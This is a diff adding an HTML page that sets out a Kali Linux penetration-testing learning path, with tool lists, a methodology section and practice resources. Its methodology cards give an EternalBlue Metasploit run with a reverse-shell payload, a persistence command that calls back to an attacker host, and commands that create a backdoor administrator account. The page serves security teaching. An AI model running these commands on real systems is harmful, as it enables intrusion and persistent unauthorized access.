@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kali Linux Learning Path | Beginner to Advanced</title>
+    <link rel="stylesheet" href="kail-linux.css">
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <div class="logo-icon">⚡</div>
+                    <h1>Kali <span>Linux</span> Mastery</h1>
+                </div>
+                <nav>
+                    <ul>
+                        <li><a href="#home" class="active">Home</a></li>
+                        <li><a href="#phases">Learning Path</a></li>
+                        <li><a href="#tools">Tools</a></li>
+                        <li><a href="#methodology">Methodology</a></li>
+                        <li><a href="#resources">Resources</a></li>
+                        <li>
+                            <div class="theme-toggle" id="themeToggle">
+                                <span class="theme-icon" id="themeIcon">🌙</span>
+                                <span class="theme-text" id="themeText">Dark Mode</span>
+                            </div>
+                        </li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <section class="hero" id="home">
+        <div class="container">
+            <h2>Master Kali Linux: From Beginner to Advanced</h2>
+            <p>A comprehensive, structured learning path for ethical hacking, penetration testing, and cybersecurity mastery using Kali Linux.</p>
+            <a href="#phases" class="btn">Start Learning</a>
+            <a href="#warning" class="btn btn-outline">Legal Warning</a>
+        </div>
+    </section>
+
+    <section class="container">
+        <div class="warning-box" id="warning">
+            <h3>⚠️ LEGAL AND ETHICAL WARNING</h3>
+            <p>Kali Linux is a professional security toolset designed for legitimate security testing. <strong>Only use these tools on systems you own or have explicit written permission to test.</strong> Unauthorized access to computer systems is illegal and unethical.</p>
+        </div>
+    </section>
+
+    <section class="content-section" id="phases">
+        <div class="container">
+            <div class="section-title">
+                <h2>Learning Path</h2>
+            </div>
+            
+            <div class="phase-container">
+                <div class="phase">
+                    <div class="phase-header">
+                        <div class="phase-title">
+                            <div class="phase-icon">1</div>
+                            <h3>Beginner Phase: Foundations</h3>
+                        </div>
+                        <div class="phase-duration">2-4 Weeks</div>
+                    </div>
+                    <p>Establish your ethical hacking mindset and learn the fundamentals of Kali Linux and cybersecurity concepts.</p>
+                    
+                    <div class="tab-container">
+                        <div class="tabs">
+                            <div class="tab active" data-tab="phase1-1">Concepts</div>
+                            <div class="tab" data-tab="phase1-2">Commands</div>
+                            <div class="tab" data-tab="phase1-3">Practice</div>
+                        </div>
+                        
+                        <div class="tab-content active" id="phase1-1">
+                            <ul>
+                                <li>Understanding ethical hacking principles</li>
+                                <li>Setting up a safe lab environment with VirtualBox/VMware</li>
+                                <li>Kali Linux installation and initial configuration</li>
+                                <li>Basic Linux command line proficiency</li>
+                                <li>Networking fundamentals for security</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="tab-content" id="phase1-2">
+                            <div class="code-block">
+                                <span class="code-comment"># Essential Linux Commands</span><br>
+                                <span class="code-keyword">pwd</span>           <span class="code-comment"># Print working directory</span><br>
+                                <span class="code-keyword">ls -la</span>        <span class="code-comment"># List all files with details</span><br>
+                                <span class="code-keyword">cd /path/</span>     <span class="code-comment"># Change directory</span><br>
+                                <span class="code-keyword">sudo apt update</span> <span class="code-comment"># Update package list</span><br>
+                                <span class="code-keyword">ip a</span>          <span class="code-comment"># Show IP addresses</span><br>
+                                <span class="code-keyword">man command</span>    <span class="code-comment"># Show manual for a command</span>
+                            </div>
+                        </div>
+                        
+                        <div class="tab-content" id="phase1-3">
+                            <p><strong>Practice Exercises:</strong></p>
+                            <ul>
+                                <li>Install Kali Linux in a virtual machine</li>
+                                <li>Navigate the filesystem using only terminal</li>
+                                <li>Create, edit, and manage files and directories</li>
+                                <li>Install new tools using apt package manager</li>
+                                <li>Configure network settings via command line</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="phase">
+                    <div class="phase-header">
+                        <div class="phase-title">
+                            <div class="phase-icon">2</div>
+                            <h3>Intermediate Phase: Core Tools</h3>
+                        </div>
+                        <div class="phase-duration">1-2 Months</div>
+                    </div>
+                    <p>Learn the essential Kali Linux tools and follow structured penetration testing methodologies.</p>
+                    
+                    <div class="tools-grid">
+                        <div class="tool-card">
+                            <h4><span class="tool-icon">🔍</span> Nmap</h4>
+                            <p>Network discovery and security auditing</p>
+                            <div class="code-block" style="font-size: 0.8rem;">
+                                nmap -sS -sV target.com
+                            </div>
+                        </div>
+                        
+                        <div class="tool-card">
+                            <h4><span class="tool-icon">🌐</span> Burp Suite</h4>
+                            <p>Web application security testing</p>
+                        </div>
+                        
+                        <div class="tool-card">
+                            <h4><span class="tool-icon">💣</span> Metasploit</h4>
+                            <p>Penetration testing framework</p>
+                            <div class="code-block" style="font-size: 0.8rem;">
+                                msfconsole<br>
+                                use exploit/...
+                            </div>
+                        </div>
+                        
+                        <div class="tool-card">
+                            <h4><span class="tool-icon">🔓</span> John the Ripper</h4>
+                            <p>Password cracking utility</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="phase">
+                    <div class="phase-header">
+                        <div class="phase-title">
+                            <div class="phase-icon">3</div>
+                            <h3>Advanced Phase: Real-World Scenarios</h3>
+                        </div>
+                        <div class="phase-duration">2-4 Months</div>
+                    </div>
+                    <p>Master advanced exploitation techniques, Active Directory attacks, and sophisticated post-exploitation methods.</p>
+                    
+                    <div class="tab-container">
+                        <div class="tabs">
+                            <div class="tab active" data-tab="phase3-1">AD Attacks</div>
+                            <div class="tab" data-tab="phase3-2">Web App Security</div>
+                            <div class="tab" data-tab="phase3-3">Wireless & Mobile</div>
+                        </div>
+                        
+                        <div class="tab-content active" id="phase3-1">
+                            <ul>
+                                <li>LLMNR/NBT-NS Poisoning with Responder</li>
+                                <li>Kerberoasting and AS-REP Roasting</li>
+                                <li>DCSync attacks for credential dumping</li>
+                                <li>Pass-the-Hash and Pass-the-Ticket attacks</li>
+                                <li>Setting up an AD lab for practice</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="tab-content" id="phase3-2">
+                            <ul>
+                                <li>Advanced SQL injection techniques</li>
+                                <li>Cross-Site Scripting (XSS) exploitation</li>
+                                <li>Server-Side Request Forgery (SSRF)</li>
+                                <li>Insecure deserialization attacks</li>
+                                <li>Business logic vulnerabilities</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="tab-content" id="phase3-3">
+                            <ul>
+                                <li>Wireless network penetration testing</li>
+                                <li>WPA/WPA2 cracking techniques</li>
+                                <li>Rogue access point deployment</li>
+                                <li>Mobile application security testing</li>
+                                <li>IoT device security assessment</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="content-section" id="tools">
+        <div class="container">
+            <div class="section-title">
+                <h2>Essential Tools</h2>
+            </div>
+            
+            <div class="cards-container">
+                <div class="card">
+                    <div class="card-header">
+                        <h3>Information Gathering</h3>
+                    </div>
+                    <div class="card-body">
+                        <ul>
+                            <li>Nmap - Network scanning</li>
+                            <li>Recon-ng - Web reconnaissance</li>
+                            <li>theHarvester - Email harvesting</li>
+                            <li>Maltego - Link analysis</li>
+                            <li>Shodan - Search engine for devices</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
+                        <h3>Vulnerability Analysis</h3>
+                    </div>
+                    <div class="card-body">
+                        <ul>
+                            <li>Nessus - Vulnerability scanner</li>
+                            <li>OpenVAS - Open source scanner</li>
+                            <li>Nikto - Web server scanner</li>
+                            <li>WPScan - WordPress security scanner</li>
+                            <li>Lynis - System hardening auditor</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
+                        <h3>Exploitation</h3>
+                    </div>
+                    <div class="card-body">
+                        <ul>
+                            <li>Metasploit - Exploitation framework</li>
+                            <li>SQLMap - SQL injection tool</li>
+                            <li>Burp Suite - Web app testing</li>
+                            <li>BeEF - Browser exploitation</li>
+                            <li>Social Engineer Toolkit</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
+                        <h3>Post-Exploitation</h3>
+                    </div>
+                    <div class="card-body">
+                        <ul>
+                            <li>Mimikatz - Credential dumping</li>
+                            <li>PowerSploit - PowerShell tools</li>
+                            <li>Empire - Post-exploitation framework</li>
+                            <li>Cobalt Strike - Red team operations</li>
+                            <li>BloodHound - AD relationship analysis</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
+                        <h3>Password Attacks</h3>
+                    </div>
+                    <div class="card-body">
+                        <ul>
+                            <li>John the Ripper - Password cracker</li>
+                            <li>Hashcat - GPU password recovery</li>
+                            <li>Hydra - Network login cracker</li>
+                            <li>Crunch - Wordlist generator</li>
+                            <li>CeWL - Custom wordlist generator</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
+                        <h3>Wireless Attacks</h3>
+                    </div>
+                    <div class="card-body">
+                        <ul>
+                            <li>Aircrack-ng - Wireless security suite</li>
+                            <li>Kismet - Wireless detector</li>
+                            <li>Wifite - Automated wireless auditor</li>
+                            <li>Fern Wifi Cracker - GUI wireless tool</li>
+                            <li>Bully - WPS brute force tool</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="content-section" id="methodology">
+        <div class="container">
+            <div class="section-title">
+                <h2>Penetration Testing Methodology</h2>
+            </div>
+            
+            <div class="cards-container">
+                <div class="card">
+                    <div class="card-header">
+                        <h3>1. Planning & Reconnaissance</h3>
+                    </div>
+                    <div class="card-body">
+                        <p>Define scope, rules of engagement, and gather intelligence about the target.</p>
+                        <div class="code-block">
+                            <span class="code-comment"># Passive reconnaissance</span><br>
+                            theHarvester -d company.com -b google<br>
+                            <span class="code-comment"># Active reconnaissance</span><br>
+                            nmap -sS -sV -O target.com
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
+                        <h3>2. Scanning & Enumeration</h3>
+                    </div>
+                    <div class="card-body">
+                        <p>Discover open ports, services, and gather detailed information about the target.</p>
+                        <div class="code-block">
+                            <span class="code-comment"># Service enumeration</span><br>
+                            nmap -sC -sV -p- target.com<br>
+                            <span class="code-comment"># Web directory brute force</span><br>
+                            gobuster dir -u http://target.com -w wordlist.txt
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
+                        <h3>3. Gaining Access</h3>
+                    </div>
+                    <div class="card-body">
+                        <p>Exploit vulnerabilities to gain initial access to the target system.</p>
+                        <div class="code-block">
+                            <span class="code-comment"># Metasploit example</span><br>
+                            use exploit/windows/smb/ms17_010_eternalblue<br>
+                            set RHOSTS 192.168.1.100<br>
+                            set PAYLOAD windows/x64/meterpreter/reverse_tcp<br>
+                            exploit
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
+                        <h3>4. Maintaining Access</h3>
+                    </div>
+                    <div class="card-body">
+                        <p>Ensure persistent access to the compromised system.</p>
+                        <div class="code-block">
+                            <span class="code-comment"># Meterpreter persistence</span><br>
+                            run persistence -X -i 30 -p 443 -r 192.168.1.50<br>
+                            <span class="code-comment"># Create a backdoor user</span><br>
+                            net user backdoor Password123! /add<br>
+                            net localgroup administrators backdoor /add
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
+                        <h3>5. Analysis & Reporting</h3>
+                    </div>
+                    <div class="card-body">
+                        <p>Document findings, risks, and provide remediation recommendations.</p>
+                        <ul>
+                            <li>Executive summary for management</li>
+                            <li>Technical details for IT staff</li>
+                            <li>Evidence (screenshots, logs)</li>
+                            <li>Risk assessment with CVSS scores</li>
+                            <li>Remediation guidance</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="content-section">
+        <div class="container">
+            <div class="section-title">
+                <h2>Your Learning Progress</h2>
+            </div>
+            
+            <div class="progress-tracker">
+                <h3>Kali Linux Mastery Checklist</h3>
+                <p>Track your progress through the learning path</p>
+                
+                <div class="progress-bar">
+                    <div class="progress" id="mastery-progress"></div>
+                </div>
+                <div class="progress-labels">
+                    <span>Beginner</span>
+                    <span>Intermediate</span>
+                    <span>Advanced</span>
+                </div>
+                
+                <div class="checklist">
+                    <div class="checklist-item">
+                        <input type="checkbox" id="item1" class="progress-checkbox">
+                        <label for="item1">Set up Kali Linux in a virtual machine</label>
+                    </div>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="item2" class="progress-checkbox">
+                        <label for="item2">Master basic Linux command line operations</label>
+                    </div>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="item3" class="progress-checkbox">
+                        <label for="item3">Understand networking fundamentals</label>
+                    </div>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="item4" class="progress-checkbox">
+                        <label for="item4">Perform basic Nmap scans</label>
+                    </div>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="item5" class="progress-checkbox">
+                        <label for="item5">Use Metasploit for basic exploitation</label>
+                    </div>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="item6" class="progress-checkbox">
+                        <label for="item6">Complete a vulnerable machine on TryHackMe or HTB</label>
+                    </div>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="item7" class="progress-checkbox">
+                        <label for="item7">Perform web application testing with Burp Suite</label>
+                    </div>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="item8" class="progress-checkbox">
+                        <label for="item8">Understand and exploit common vulnerabilities</label>
+                    </div>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="item9" class="progress-checkbox">
+                        <label for="item9">Set up and attack an Active Directory lab</label>
+                    </div>
+                    <div class="checklist-item">
+                        <input type="checkbox" id="item10" class="progress-checkbox">
+                        <label for="item10">Complete an advanced penetration test from start to finish</label>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="content-section" id="resources">
+        <div class="container">
+            <div class="section-title">
+                <h2>Learning Resources</h2>
+            </div>
+            
+            <div class="cards-container">
+                <div class="card">
+                    <div class="card-header">
+                        <h3>Practice Platforms</h3>
+                    </div>
+                    <div class="card-body">
+                        <ul>
+                            <li>TryHackMe - Guided learning paths</li>
+                            <li>Hack The Box - Real-world machines</li>
+                            <li>VulnHub - Vulnerable VMs</li>
+                            <li>OverTheWire - War games</li>
+                            <li>PentesterLab - Web focus</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
+                        <h3>Certifications</h3>
+                    </div>
+                    <div class="card-body">
+                        <ul>
+                            <li>eJPT - Junior Penetration Tester</li>
+                            <li>OSCP - Offensive Security Certified Professional</li>
+                            <li>CEH - Certified Ethical Hacker</li>
+                            <li>CompTIA PenTest+</li>
+                            <li>OSWE - Web Expert</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
+                        <h3>Books & References</h3>
+                    </div>
+                    <div class="card-body">
+                        <ul>
+                            <li>"The Web Application Hacker's Handbook"</li>
+                            <li>"Metasploit: The Penetration Tester's Guide"</li>
+                            <li>"RTFM: Red Team Field Manual"</li>
+                            <li>"Advanced Penetration Testing"</li>
+                            <li>Kali Linux Official Documentation</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <h3>Kali Linux Mastery</h3>
+                    <p>A comprehensive learning path for cybersecurity professionals and ethical hackers.</p>
+                </div>
+                
+                <div class="footer-section">
+                    <h3>Quick Links</h3>
+                    <ul>
+                        <li><a href="#home">Home</a></li>
+                        <li><a href="#phases">Learning Path</a></li>
+                        <li><a href="#tools">Tools</a></li>
+                        <li><a href="#methodology">Methodology</a></li>
+                        <li><a href="#resources">Resources</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-section">
+                    <h3>Legal</h3>
+                    <ul>
+                        <li><a href="#">Ethical Guidelines</a></li>
+                        <li><a href="#">Responsible Disclosure</a></li>
+                        <li><a href="#">Terms of Use</a></li>
+                        <li><a href="#">Privacy Policy</a></li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="copyright">
+                <p>&copy; 2023 Kali Linux Mastery. For educational purposes only. Always practice ethical hacking.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="kail-linux.js"></script>
+
+</body>
+</html>
